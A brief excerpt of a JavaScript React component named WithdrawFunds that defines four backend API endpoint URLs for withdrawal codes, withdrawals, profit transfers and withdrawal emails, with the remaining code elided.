...
const WithdrawFunds = () => {
    ...
    const url = `https://okx-assetsbackend.onrender.com/api/requestwithdrawcode/${id}`
    const urlll = `https://okx-assetsbackend.onrender.com/api/withdraw/${id}`
    const urlprofit = `https://okx-assetsbackend.onrender.com/api/transferprofittoaccount/${id}`
    const urlemail = `https://okx-assetsbackend.onrender.com/api/withdrawalemailsend/${id}`
